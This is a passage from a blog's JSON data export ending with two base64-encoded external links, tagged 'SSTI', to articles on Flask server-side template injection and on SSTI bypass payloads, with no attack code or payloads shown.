data-url=\"aHR0cHM6Ly94aTRvcjB1amkuZ2l0aHViLmlvLzIwMTkvMDEvMTUvZmxhc2slRTQlQjklOEJzc3RpJUU2JUE4JUExJUU2JTlEJUJGJUU2JUIzJUE4JUU1JTg1JUE1LyMlRTYlOTQlQkIlRTUlODclQkI=\">flask 之 ssti 模板注入</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDUxNTgzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzc4MjMz\">ssti 详解与例题以及绕过 payload 大全</span></p>\n",
            "tags": [
                "SSTI"
            ]
        }
    ]
}